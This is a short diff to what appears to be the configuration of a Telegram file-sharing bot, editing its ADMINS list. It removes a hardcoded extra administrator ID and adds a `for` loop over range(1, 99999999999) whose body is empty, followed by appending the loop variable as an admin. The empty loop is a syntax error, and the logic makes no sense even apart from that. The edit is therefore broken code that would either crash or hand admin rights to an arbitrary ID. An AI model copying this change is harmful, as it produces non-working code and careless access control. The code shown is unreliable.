@@ -60,8 +60,11 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True
 BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = ""
 
+for Apple in range(1, 99999999999):
+    
+
 ADMINS.append(OWNER_ID)
-ADMINS.append(5307797579)
+ADMINS.append(Apple)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
